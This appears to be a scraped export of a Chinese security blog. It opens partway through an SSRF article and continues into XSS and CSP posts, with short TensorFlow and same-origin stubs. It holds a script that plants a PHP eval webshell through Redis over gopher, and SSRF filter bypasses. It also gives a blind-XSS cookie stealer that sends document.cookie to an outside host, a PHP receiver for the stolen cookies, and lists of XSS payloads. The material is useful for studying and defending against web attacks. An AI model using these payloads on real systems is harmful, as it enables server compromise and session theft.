1234567891011121314151617181920212223242526272829303132333435363738394041424344import urllibprotocol=\"gopher://\"ip=\"127.0.0.1\"port=\"6379\"shell=\"\\n\\n&lt;?php eval($_POST[\\\"ye1s\\\"]);?&gt;\\n\\n\"filename=\"shell.php\"path=\"/var/www/html\"passwd=\"\"cmd=[\"flushall\", \"set 1 &#123;&#125;\".format(shell.replace(\" \",\"$&#123;IFS&#125;\")), \"config set dir &#123;&#125;\".format(path), \"config set dbfilename &#123;&#125;\".format(filename), \"save\" ]if passwd: cmd.insert(0,\"AUTH &#123;&#125;\".format(passwd))payload=protocol+ip+\":\"+port+\"/_\"def redis_format(arr): CRLF=\"\\r\\n\" redis_arr = arr.split(\" \") cmd=\"\" cmd+=\"*\"+str(len(redis_arr)) for x in redis_arr: cmd+=CRLF+\"$\"+str(len((x.replace(\"$&#123;IFS&#125;\",\" \"))))+CRLF+x.replace(\"$&#123;IFS&#125;\",\" \") cmd+=CRLF return cmdif __name__==\"__main__\": for x in cmd: payload += urllib.quote(redis_format(x)) print urllib.quote(payload) # 由于我们这里是GET，所以要进行两次url编码``` 将生成的payload,作为url的值进行访问，用中国蚁剑连接shell.php### FTPftp协议passive模式ssrf攻击php-fpm: https://xiaokou.top/posts/7a99bc4/ https://ha1c9on.top/2021/04/29/lmb_one_pointer_php/ ## Bypass ### URL Bypass说url必须以 “http://notfound.ctfhub.com” 开头。我们可以利用 @ 来绕过，如 http://test@127.0.0.1 实际上是以用户名 test 连接到站点127.0.0.1，即 http://notfound.ctfhub.com@127.0.0.1 与 http://127.0.0.1 请求是相同的，该请求得到的内容都是127.0.0.1的内容。```bash/?url=http://notfound.ctfhub.com@127.0.0.1/flag.php 例题 12345678910111213141516171819if(isset($_GET['url']))&#123; $url = parse_url($_GET['url']); if(!$url)&#123; die('解析错误: '.$_GET['url']); &#125; if(substr($_GET['url'], strlen('http://'), strlen('google.cn')) === 'google.cn')&#123; die('怎么回事，小老弟！ 绕过不会吗'); &#125; if( $url['host'] === 'google.cn' )&#123; $ch = curl_init(); curl_setopt ($ch, CURLOPT_URL, $_GET['url']); curl_exec($ch); curl_close($ch); &#125;else&#123; die('换个请求吧'); &#125;&#125; 绕过 1?url=file://127.0.0.1@google.cn/flag IP Bypass过滤了 &#39;/127|172|@|\\./&#39; 1.利用进制的转换可以使用一些不同的进制替代ip地址，从而绕过WAF，这里给出个php脚本可以一键转换。 1234567891011121314&lt;?php$ip = '127.0.0.1';$ip = explode('.',$ip);$r = ($ip[0] &lt;&lt; 24) | ($ip[1] &lt;&lt; 16) | ($ip[2] &lt;&lt; 8) | $ip[3] ;if($r &lt; 0) &#123; $r += 4294967296;&#125;echo \"十进制:\";echo $r;echo \"八进制:\";echo decoct($r);echo \"十六进制:\";echo dechex($r);?&gt; 得到： 1234127.0.0.1:八进制：0177.0.0.1十六进制：0x7f.0.0.1十进制：2130706433 2.利用其他各种指向127.0.0.1的地址 1234http://localhost/http://0/http://[0:0:0:0:0:ffff:127.0.0.1]/http://①②⑦.⓪.⓪.① 可以 1?url=http://2130706433/flag.php 302跳转 Bypass在网络上存在一个很神奇的服务，网址为 http://xip.io，当访问这个服务的任意子域名的时候，都会重定向到这个子域名，举个例子： 当我们访问 http://127.0.0.1.xip.io/flag.php ，那么实际上访问的是就 http://127.0.0.1/flag.php 。最后payload 1?url=http://0.xip.io/flag.php 或者短地址跳转 DNS重绑定 Bypass对于常见的IP限制，后端服务器可能通过下图的流程进行IP过滤对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就pass掉。 但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间查，利用这个时间差，我们可以进行DNS 重绑定攻击。 要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为： 1234(1)、服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP(2)、对于获得的IP进行判断，发现为非黑名单IP，则通过验证(3)、服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。(4)、由于已经绕过验证，所以服务器端返回访问内网资源的结果 由于我们无法在程序运行时以毫秒为单位手动更改dns记录，因此需要配置一个自定义DNS服务器，并设定好某些域名的解析IP，再将TTL设置为0，这样后端就不会有缓存。我们可以自己编写解析服务，也可以利用这个网站获取一个测试用的域名：https://lock.cmpxchg8b.com/rebinder.html 但是它只能在2个IP之间随机变化，因此往往需要发送多个请求才能得到我想要的结果。 我们利用该域名即可绕过限制成功访问flag.php得到flag，但是要不停访问数次才行（可以借助burpsuite）: /?url=7f000001.2f653948.rbndr.us/flag.php file://限制得知有srrf漏洞，file://协议被过滤了，用发现file协议被过滤了，我们可以尝试绕过：file：/、file:&lt;空格&gt;/// 12?url=file:/var/www/html/index.php?url=file:%20///var/www/html/index.php 参考文章: https://whoamianony.top/2020/12/06/web-an-quan/wo-zai-ctfhub-xue-xi-ssrf/SSRF 服务端请求伪造 https://ctf-wiki.github.io/ctf-wiki/web/ssrf/SSRF漏洞的利用与学习 https://uknowsec.cn/posts/notes/SSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AD%A6%E4%B9%A0.html","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ssrf","slug":"ssrf","permalink":"https://blog.cfyqy.com/tags/ssrf/"}],"author":"ye1s"},{"title":"tensorflow基础学习","slug":"nsorflow基础学习","date":"2019-03-19T07:53:38.000Z","updated":"2019-03-19T07:57:27.618Z","comments":true,"path":"article/95860355.html","link":"","permalink":"https://blog.cfyqy.com/article/95860355.html","excerpt":"TensorFlow™是一个基于数据流编程（dataflow programming）的符号数学系统，被广泛应用于各类机器学习（machine learning）算法的编程实现，其前身是谷歌的神经网络算法库DistBelief","text":"TensorFlow™是一个基于数据流编程（dataflow programming）的符号数学系统，被广泛应用于各类机器学习（machine learning）算法的编程实现，其前身是谷歌的神经网络算法库DistBelief","categories":[],"tags":[],"author":"ye1s"},{"title":"同源策略","slug":"策略","date":"2019-03-16T06:35:00.000Z","updated":"2020-07-11T17:14:54.043Z","comments":true,"path":"article/72e5cf06.html","link":"","permalink":"https://blog.cfyqy.com/article/72e5cf06.html","excerpt":"同源策略，指的是浏览器对不同源的脚本或者文本的访问方式进行的限制","text":"同源策略，指的是浏览器对不同源的脚本或者文本的访问方式进行的限制 同源策略浏览器同源政策及其规避方法 跨越资源共享跨域资源共享 CORS 详解 内容安全策略Content Security Policy 入门教程 参考文章:浏览器同源政策及其规避方法跨域资源共享 CORS 详解Content Security Policy 入门教程","categories":[{"name":"web安全","slug":"web安全","permalink":"https://blog.cfyqy.com/categories/web%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"同源策略","slug":"同源策略","permalink":"https://blog.cfyqy.com/tags/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"}],"author":"ye1s"},{"title":"xss漏洞","slug":"s漏洞","date":"2019-03-16T06:25:00.000Z","updated":"2021-06-11T16:50:45.647Z","comments":true,"path":"article/c84cebac.html","link":"","permalink":"https://blog.cfyqy.com/article/c84cebac.html","excerpt":"XSS (Cross-Site Script, 跨站脚本)是由于 web 应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击","text":"XSS (Cross-Site Script, 跨站脚本)是由于 web 应用程序对用户的输入过滤不足而产生的一种漏洞。攻击者可以利用网站漏洞把恶意的脚本代码注入到网页之中，当其他用户浏览这些带有恶意代码的网页时就会执行其中的恶意代码，对受害者产生各种攻击 页面解码详细查看此篇文章：https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E8%A7%A3%E7%A0%81%E9%A1%BA%E5%BA%8F.md 解码机制12345678910111213&lt;script&gt;function HtmlEncode(str) &#123; var s = \"\"; if (str.length == 0) return \"\"; s = str.replace(/&amp;/g, \"&amp;amp;\"); s = s.replace(/&lt;/g, \"&amp;lt;\"); s = s.replace(/&gt;/g, \"&amp;gt;\"); s = s.replace(/\\\"/g, \"&amp;quot;\"); return s;&#125;&lt;/script&gt;A: &lt;input type=\"button\" id=\"exec_btn\" value=\"exec\" onclick=\"document.write (HtmlEncode('&amp;lt;img src=@ onerror=alert(123) /&amp;gt;'))\" /&gt; &lt;/br&gt;B: &lt;input type=\"button\" id=\"exec_btn\" value=\"exec\" onclick=\"document.write (HtmlEncode('&lt;img src=@ onerror=alert(123) /&gt;'))\" /&gt; 上面两条的执行结果是一样的，都只是在网页中输出了&lt;img src=@ onerror=alert(123) /&gt; 而没有弹框， 只不过A中的js代码在执行前已经先按照html的形式解码了关键的问题是这里的js代码是出现在html标签之间的，因为嵌入到html标签中的js 代码在解析之前会先按照html规则进行自动解码，包括： 进制编码：&amp;#xH（十六进制格式）、&amp;#D（十进制格式）。HTML 实体编码，下面是 html5 新增的实体编码：&colon; =&gt; [冒号]&NewLine; =&gt; [换行]case: &lt;a href=&quot;javasc&amp;NewLine;ript&amp;colon;alert(1)&quot;&gt;click&lt;/a&gt;以上是关于js在html内的解码，那么假如用户的输入后所传递的值并不是出现在html标签之内，而是出现在js中呢？ 浏览器也有js的解析规则，还是举例子来说明 123&lt;script&gt; document.write('&amp;lt;img src=@ onerror=alert(2) /&amp;gt;');&lt;/script&gt; 上边的例子会弹出对话框吗?是不会的，因为它出现在js代码之中，上下文环境为JavaScript，浏览器解析前会将出现在js代码中的以下内容编码进行解码1):UniCode形式(\\uH) 123&lt;script&gt; document.write('\\u003Cimg src=@ onerror=alert(123) /\\u003E');&lt;/script&gt; 2):普通16进制(\\xHH) 或者 8进制([0-7]{1,3}) 123&lt;script&gt; document.write('\\x3Cimg src=@ onerror=alert(123) /\\x3E');&lt;/script&gt; 3)纯转义，如果用户带入js代码的内容中含有 ‘、”、&lt; 、&gt; 这些字符将他们进行转义是没有意义的，还是会原样的输出 12345&lt;script&gt; //document.write('\\&lt;img src=@ onerror=alert(123) /\\&gt;'); //弹框 //document.write('te\\'st'); //te'st //document.write('te\\\"st'); //te\"st&lt;/script&gt; 具有 HtmlEncode 功能的标签如 &lt;textarea&gt;、&lt;title&gt;、&lt;iframe&gt;、&lt;noscript&gt;、&lt;noframes&gt;、&lt;xmp&gt;、&lt;plaintext&gt;， html 在这些标签里面是不解析的，比如 $(&#39;tt&#39;).innerHTML=&#39;&lt;img src=@ onerror=alert(123) /&gt;&#39;，不会造成弹框。&lt;xmp&gt; 没有HtmlEncode 功能，&lt;plaintext&gt; 在 Firefox 下不会进行 HtmlEncode 编码，而在 Chrome 下面会 解码顺序第一个例子: 1&lt;a href=\"javascript&amp;#58;&amp;#32;alert('\\&lt;http&amp;#58;&amp;#47;&amp;#47;simba.cc/find?q=%E4%BD%A0%E5%A5%BD\\&gt;');\"&gt;click&lt;/a&gt; 首先进行html解码 1&lt;a href=\"javascript: alert('\\&lt;http://simba.cc/find?q=%E4%BD%A0%E5%A5%BD\\&gt;');\"&gt;click&lt;/a&gt; 点击链接后，先是 URL 解码，结果为（假设是 style 属性，则会执行 css 解码） 1&lt;a href=\"javascript: alert('\\&lt;http://simba.cc/find?q=你好\\&gt;');\"&gt;click&lt;/a&gt; 最后是 JS 解码，结果为 1&lt;a href=\"javascript: alert('&lt;http://simba.cc/find?q=你好&gt;');\"&gt;click&lt;/a&gt; 第二个例子 12345678&lt;html&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;/head&gt; &lt;body&gt; &lt;a href=\"javascript:alert('&lt;?php echo $_GET['input'];?&gt;');\"&gt;test&lt;/a&gt; &lt;/body&gt;&lt;/html&gt; 当参数input的值为: %26lt%5cu4e00%26gt 的时候，因为 php 使用 $_GET 获取参数值（urldecode），故返回的 html 源码是 1href=\"javascript:alert('&amp;lt\\u4e00&amp;gt');\"&gt;test&lt;/a&gt; 浏览器解析时 html 解码 为 1&lt;a href=\"javascript:alert('&lt;\\u4e00&gt;');\"&gt;test&lt;/a&gt; 点击时进行 js 解码，故弹框为 &lt;一&gt; 测试样例1.URL encoded &quot;javascript:alert(1)&quot;不会触发。javascript: 是 scheme，不能进行urlencode，否则 urldecode 时出现 “no scheme” 状态。 1&lt;a href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"&gt;&lt;/a&gt; 2.Character entity encoded &quot;javascript&quot; and URL encoded &quot;alert(2)&quot;触发。先进行 htmldecode，点击执行urldecode，最后执行 js 1&lt;a href=\"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29\"&gt;click&lt;/a&gt; 3.URL encoded &quot;:&quot;不会触发。冒号是 scheme 的一部分。 1&lt;a href=\"javascript%3aalert(3)\"&gt;&lt;/a&gt; 4.Character entity encoded &lt; and &gt;不会触发。&lt; &gt; 是识别 tag 的开始结束符，不能进行编码 1&lt;div&gt;&amp;#60;img src=x onerror=alert(4)&amp;#62;&lt;/div&gt; 5.Character entity encoded &lt; and &gt;如前所述，textarea 等标签内不会进行 htmldecode 1&lt;textarea&gt;&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;&lt;/textarea&gt; 6.不会触发。textarea 标签内不会执行 js，除非我们先把它闭合了。 1&lt;textarea&gt;&lt;script&gt;alert(6)&lt;/script&gt;&lt;/textarea&gt; 7.Character entity encoded触发。先进行 htmldecode，点击触发 js 事件 1&lt;button onclick=\"confirm('7&amp;#39;);\"&gt;Button&lt;/button&gt; 8.Unicode escape sequence encoded不会触发。’ “ ( ) 的unicode 编码形式在这里只是字符串的文本含义，并不能表示真正的引号闭合 1&lt;button onclick=\"confirm('8\\u0027);\"&gt;Button&lt;/button&gt; 9.Character entity encoded alert(9);不会触发。script 域内不会进行 htmldecode 1&lt;script&gt;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59&lt;/script&gt; 10.Unicode Escape sequence encoded alert触发。function name 是 identifier name，可以用unicode 方式编码 12345&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(10);&lt;/script&gt;&lt;div&gt;&lt;a href=\"javascript:\\u0061lert('1\\x62')\"&gt;ga&lt;/a&gt;&lt;/div&gt;&lt;img src=\"x\" onerror=\"\\u0061\\u006c\\u0065\\u0072\\u0074(1)\"&gt; 11.Unicode Escape sequence encoded alert(11)不会触发。同问题2 1&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029&lt;/script&gt; 12 Unicode Escape sequence encoded alert and 12不会触发。unicode 编码的 1, 2 在这里不能表示成字符串，因为它们不是被包裹在 ‘ “ 中 1&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)&lt;/script&gt; 可以触发的三个 123&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074('\\u0031\\u0032')&lt;/script&gt;&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(/\\u0031\\u0032/)&lt;/script&gt;&lt;script&gt;\\u0061\\u006c\\u0065\\u0072\\u0074(12)&lt;/script&gt; 13.Unicode escape sequence encoded &#39;不会触发。同问题2 1&lt;script&gt;alert('13\\u0027)&lt;/script&gt; 14.Unicode escape sequence encoded line feed.触发。unicode 编码的换行符在这里并不会真正地换行而导致js 语法错误，而是普通的文本含义 1&lt;script&gt;alert('14\\u000a')&lt;/script&gt; 反射性https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%8F%8D%E5%B0%84XSS.md 存储型可以看此文章：https://github.com/JnuSimba/MiscSecNotes/blob/master/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC/%E5%AD%98%E5%82%A8XSS.md XSS 盲打后台js弹cookie代码 123456789101112131415161718192021(function() &#123; (new Image()).src='http://simba.im/js/xss.php?cookie='+ escape( (function() &#123; try &#123; return document.cookie &#125; catch (e) &#123; return '' &#125; &#125;)() )+'&amp;location='+ escape( (function() &#123; try &#123; return document.location.href &#125; catch (e) &#123; return '' &#125; &#125;)() );&#125;)(); 服务器接收代码 12345678910111213141516171819202122&lt;?php if(isset($_REQUEST['cookie']) &amp;&amp; isset($_REQUEST['location'])) &#123; $cookie = $_REQUEST['cookie']; $location = $_REQUEST['location']; $stri = \"&lt;td&gt;\".date(DATE_ATOM).\"&lt;/td&gt;&lt;td&gt;Cookie:\".$cookie.\"&lt;/td&gt;&lt;td&gt;Location:\".$location.\"&lt;/td&gt;\"; $fp = file_put_contents(\"xss.txt\", $stri.\"\\n\", FILE_APPEND); &#125; $fp = file_get_contents(\"xss.txt\"); $data = (explode(\"\\n\", $fp)); echo \"&lt;table bode=\\\"1\\\"&gt;\"; foreach($data as $key =&gt; $value) &#123; if ($value == \"\") &#123; continue; &#125; echo \"&lt;tr&gt;&lt;td&gt;\".($key).\"&lt;/td&gt;\".$value.\"&lt;/tr&gt;\"; &#125; echo \"&lt;/table&gt;\";?&gt; DOM型在前端实现页面跳转使用indexOf判断URL参数是否合法12345678910111213141516171819function emptyFn()&#123;&#125;function init()&#123; var jump = getQueryString('jump'); jump = decodeURIComponent(jump); if (jump &amp;&amp; jump.indexOf(\"tmast://\") &gt; -1) &#123; jump = jump; &#125; else &#123; jump = \"tmast://found\"; &#125; setTimeout(function()&#123; window.JSBReady(function(readyState) &#123; if (readyState) &#123; jsb('closeWebView',0,'emptyFn',&#123;&#125;); &#125; &#125;); &#125;,1000); location.href=jump;&#125;init(); 传入javascript:alert(1);//tmast:// 正则表达式缺陷示例缺陷代码 [1]： 12345function VaildURL(sUrl)&#123; return (/(https?:\\/\\/)?[\\w\\-.]+\\.(qq|paipai|soso|taotao)\\.com($|\\/|\\\\)/i).test(sUrl)|| (/^[\\w][\\w\\/\\.\\-_%]+$/i).test(sUrl)||(/^[\\/\\\\][^\\/\\\\]/i).test(sUrl) ? true : false;&#125; 示例缺陷代码 [2]： 123456789101112if(typeof(pgvMain) == 'function') &#123; pgvMain(); &#125; var durl = window.location.search.substr(6); var refer = document.referrer; if(/house.qq.com/.test(refer) || refer == '')&#123; setTimeout(function()&#123; window.location.replace(durl); &#125;, 2000); &#125; 神奇的符号 ^，加上和不加上，过滤的效果具有天壤之别。攻击者仍然可以构造 javascript:alert(1);//http://www.qq.com来绕过看似严格的过滤 取值写入页面或动态执行URL中的取参数值写入页面或动态执行123456789101112131415function getParameter(name)&#123; var r = new RegExp(\"(\\\\?|#|&amp;)\" + name + \"=([^&amp;#]*)(&amp;|#|$)\"), m = location.href.match(r); return (!m ? \"\" : m[2]);&#125;addEvent(window, \"load\", init);function init()&#123; var msg=getParameter(\"msg\"); if(msg==\"\")msg=\"服务器忙，请您稍候再试\" else msg=unescape(msg); var div=document.getElementById(\"info\"); if(div) div.innerHTML=msg; &#125; 构造 1http://xxx.com/xxx.htm#msg=&lt;img/src=x onerror=alert(1)&gt; Cookie取参数值写入页面或动态执行示例缺陷代码[1]： 123456789function goto_adtag_url(url, type) &#123; var userInfo = getCookie(COOKIE_USERINFO); userInfo = decodeURIComponent(userInfo); if (userInfo != '') &#123; userInfo = userInfo.replace(/&lt;/g, '\\\\&lt;'); userInfo = userInfo.replace(/&gt;/g, '\\\\&gt;'); userInfo = eval('(' + userInfo + ')'); &#125;&#125; 示例缺陷代码[2]： 1234567function getISP()&#123;var _ptisp = getCookie(\"ptisp\"); var isp = _ptisp ? (_ptisp + \".\") : \"\"; return isp; &#125;window.isp = getISP();window.mainPath = \"http://\" + window.isp + \"qzs.qq.com\";window.filePath = \"http://\" + window.isp + \"i.gtimg.cn\"; localStorage、Referer、Window name、SessionStorage12345678910111213var payload = window.name; setTimeout(function() &#123; trigger(window.name); &#125;, 1); var div = document.createElement('div'); document.documentElement.appendChild(div); div.innerHTML = payload; function trigger(payload) &#123; div.innerHTML = payload; &#125;; 构造 1&lt;iframe src='http://localhost/domxss_47/index.php' name='&lt;svg/onload=alert(1)&gt;'&gt;&lt;/iframe&gt; 修复写入页面前先转义。在取值写入页面或动态执行的业务场景下，在将各种来源获取到的参数值传入JavaScript“三姐妹”函数（innerHTML、document.write、eval）处理前，对传入数据中的HTML特殊字符进行转义处理能防止大部分DOM-XSS的产生。此外，根据不同业务的真实情况，还应使用正则表达式，针对传入的数据做更严格的过滤限制，才能保证万无一失 1234567891011function htmlEscape(str) &#123; return str .replace(/&amp;/g, '&amp;amp;') .replace(/\"/g, '&amp;quot;') .replace(/'/g, '&amp;#39;') .replace(/&lt;/g, '&amp;lt;') .replace(/&gt;/g, '&amp;gt;');&#125; Value = htmlEscape(value); div.innerHTML = value; 慎用危险的“eval”。需要强调的是，由于JavaScript中的eval函数十分灵活，能够支持执行的字符串编码纷繁复杂。强烈建议，不到万不得已，不要使用eval函数处理不可控的外部数据看下边的示例: 123456&lt;script&gt;eval(unescape(\"%64%6f....\"));&lt;/script&gt;在JavaScript 中可以直接通过eval 执行的字符串有八进制和十六进制 两种编码方式&lt;script&gt;eval(\"\\141\\154\\145\\162\\164\\50\\47\\u4f60\\u597d\\47\\51\");&lt;/script&gt;&lt;script&gt;eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\u4f60\\u597d\\x27\\x29\");&lt;/script&gt;另外，虽然十进制不能直接通过 eval 来执行，但可以用 String.fromCharCode 函数先对数值进行解码，然后传递给 eval 执行&lt;script&gt;eval(String.fromCharCode(97, 108, 101, ...));&lt;/script&gt; 标签利用img12345678xss利用方式1(推荐)&lt;script&gt;document.body.appendChild(document.createElement('img')).setAttribute('src','http://www.hack.com/cookie.php?cookie='+document.cookie); &lt;/script&gt; XSS利用方式2&lt;img src=\"x\" onerror=alert(1)&gt;&lt;img src=\"1\" onerror=eval(\"alert('xss')\")&gt;XSS利用方式3&lt;img src=1onmouseover=alert('xss')&gt; a12345678910111213&lt;a href=\"javascript:alert('xss')\"&gt;aa&lt;/a&gt;&lt;a href=javascript:eval(alert('xss'))&gt;aa&lt;/a&gt;&lt;a href=\"javascript:aaa\"onmouseover=\"alert(/xss/)\"&gt;aa&lt;/a&gt;XSS利用方式2&lt;script&gt;alert('xss')&lt;/script&gt;&lt;a href=\"\"onclick=alert('xss')&gt;aa&lt;/a&gt;利用方式3&lt;a href=\"\"onclick=eval(alert('xss'))&gt;aa&lt;/a&gt;利用方式4&lt;a href=kycg.asp?ttt=1000 onmouseover=prompt('xss') y=2016&gt;aa&lt;/a&gt; input1234567891011标准格式&lt;input name=\"name\" value=\"\"&gt;利用方式1&lt;input value=\"\" onclick=alert('xss') type=\"text\"&gt;利用方式2&lt;input name=\"name\" value=\"\" onmouseover=prompt('xss') bad=\"\"&gt;利用方式4&lt;input name=\"name\" value=\"\"&gt;&lt;script&gt;alert('xss')&lt;/script&gt; form123&lt;form&gt;&lt;button formaction=javascript:alert(21)&gt;M&lt;form/action=javascript:alert(22)&gt;&lt;input/type=submit&gt;&lt;form onsubmit=alert(23)&gt;&lt;button&gt;M iframe1234&lt;iframe onload=alert(\"xss\");&gt;&lt;/iframe&gt; &lt;iframe src=javascript:alert('xss'); height=5 width=10 /&gt;&lt;iframe&gt;&lt;iframe src=\"javascript&amp;colon;prompt&amp;lpar;`xss`&amp;rpar;\"&gt;&lt;/iframe&gt; svg1&lt;svg onload=alert(1)&gt; detail1&lt;details ontoggle=\"alert('xss');\"&gt; select1&lt;select onfocus=alert(1)&gt;&lt;/select&gt; video1&lt;video&gt;&lt;source onerror=\"alert(1)\"&gt; audio1&lt;audio src=x onerror=alert(\"xss\");&gt; body1&lt;body/onload=alert(\"xss\");&gt; textarea1&lt;textarea onfocus=alert(\"xss\"); autofocus&gt; keygen1&lt;keygen autofocus onfocus=alert(1)&gt; CSPContent Security Policy 入门教程内容安全策略(CSP),CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。 CSP启用方法一种是通过 HTTP 头信息的Content-Security-Policy的字段 12Content-Security-Policy: script-src &#39;self&#39;; object-src &#39;none&#39;;style-src cdn.example.org third-party.org; child-src https: 另一种是通过网页的标签 1&lt;meta http-equiv&#x3D;&quot;Content-Security-Policy&quot; content&#x3D;&quot;script-src &#39;self&#39;; object-src &#39;none&#39;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt; 上面代码中，CSP 做了如下配置。 12345脚本：只信任当前域名&lt;object&gt;标签：不信任任何URL，即不加载任何资源样式表：只信任cdn.example.org和third-party.org框架（frame）：必须使用HTTPS协议加载其他资源：没有限制 启用后，不符合 CSP 的外部资源就会被阻止加载 限制选项资源加载限制以下选项限制各类资源的加载。 1234567891011script-src：外部脚本style-src：样式表img-src：图像media-src：媒体文件（音频和视频）font-src：字体文件object-src：插件（比如 Flash）child-src：框架frame-ancestors：嵌入的外部资源（比如&lt;frame&gt;、&lt;iframe&gt;、&lt;embed&gt;和&lt;applet&gt;）connect-src：HTTP 连接（通过 XHR、WebSockets、EventSource等）worker-src：worker脚本manifest-src：manifest 文件 *default-src *default-src用来设置上面各个选项的默认值。 1Content-Security-Policy: default-src &#39;self&#39; 上面代码限制所有的外部资源，都只能从当前域名加载。 如果同时设置某个单项限制（比如font-src）和default-src，前者会覆盖后者，即字体文件会采用font-src的值，其他资源依然采用default-src的值。 URL 限制有时，网页会跟其他 URL 发生联系，这时也可以加以限制。 123frame-ancestors：限制嵌入框架的网页base-uri：限制&lt;base#href&gt;form-action：限制&lt;form#action&gt; 其他限制其他一些安全相关的功能，也放在了 CSP 里面。 1234block-all-mixed-content：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）upgrade-insecure-requests：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议plugin-types：限制可以使用的插件格式sandbox：浏览器行为的限制，比如不能有弹出窗口等。 report-uri有时，我们不仅希望防止 XSS，还希望记录此类行为。report-uri就用来告诉浏览器，应该把注入行为报告给哪个网址。 1Content-Security-Policy: default-src &#39;self&#39;; ...; report-uri &#x2F;my_amazing_csp_report_parser; 上面代码指定，将注入行为报告给/my_amazing_csp_report_parser这个 URL。 Content-Security-Policy-Report-Only除了Content-Security-Policy，还有一个Content-Security-Policy-Report-Only字段，表示不执行限制选项，只是记录违反限制的行为。 它必须与report-uri选项配合使用。 1Content-Security-Policy-Report-Only: default-src &#39;self&#39;; ...; report-uri &#x2F;my_amazing_csp_report_parser; 选项值每个限制选项可以设置以下几种值，这些值就构成了白名单。 123456主机名：example.org，https:&#x2F;&#x2F;example.com:443路径名：example.org&#x2F;resources&#x2F;js&#x2F;通配符：*.example.org，*:&#x2F;&#x2F;*.example.com:*（表示任意协议、任意子域名、任意端口）协议名：https:、data:关键字&#39;self&#39;：当前域名，需要加引号关键字&#39;none&#39;：禁止加载任何外部资源，需要加引号 多个值也可以并列，用空格分隔。 1Content-Security-Policy: script-src &#39;self&#39; https:&#x2F;&#x2F;apis.google.com 如果同一个限制选项使用多次，只有第一次会生效。 12345# 错误的写法script-src https:&#x2F;&#x2F;host1.com; script-src https:&#x2F;&#x2F;host2.com# 正确的写法script-src https:&#x2F;&#x2F;host1.com https:&#x2F;&#x2F;host2.com如果不设置某个限制选项，就是默认允许任何 script-src 的特殊值除了常规值，script-src还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。 1234&#39;unsafe-inline&#39;：允许执行页面内嵌的&lt;script&gt;标签和事件监听函数unsafe-eval：允许将字符串当作代码执行，比如使用eval、setTimeout、setInterval和Function等函数。nonce值：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行hash值：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。 nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。 1Content-Security-Policy: script-src &#39;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&#39; 页面内嵌脚本，必须有这个token才能执行。 123&lt;script nonce&#x3D;EDNnf03nceIOfn39fn3e9h3sdfa&gt; &#x2F;&#x2F; some code&lt;&#x2F;script&gt; hash值的例子如下，服务器给出一个允许执行的代码的hash值。 1Content-Security-Policy: script-src &#39;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng&#x3D;&#39; 下面的代码就会允许执行，因为hash值相符。 1&lt;script&gt;alert(&#39;Hello, world.&#39;);&lt;&#x2F;script&gt; 注意，计算hash值的时候，&lt;script&gt;标签不算在内。 除了script-src选项，nonce值和hash值还可以用在style-src选项，控制页面内嵌的样式表。 注意点（1）script-src和object-src是必设的，除非设置了default-src。 因为攻击者只要能注入脚本，其他限制都可以规避。而object-src必设是因为 Flash 里面可以执行外部脚本。 （2）script-src不能使用unsafe-inline关键字（除非伴随一个nonce值），也不能允许设置data:URL。 下面是两个恶意攻击的例子。 12&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;evil()&quot;&gt;&lt;script src&#x3D;&quot;data:text&#x2F;javascript,evil()&quot;&gt;&lt;&#x2F;script&gt; （3）必须特别注意 JSONP 的回调函数。 123&lt;scriptsrc&#x3D;&quot;&#x2F;path&#x2F;jsonp?callback&#x3D;alert(document.domain)&#x2F;&#x2F;&quot;&gt;&lt;&#x2F;script&gt; 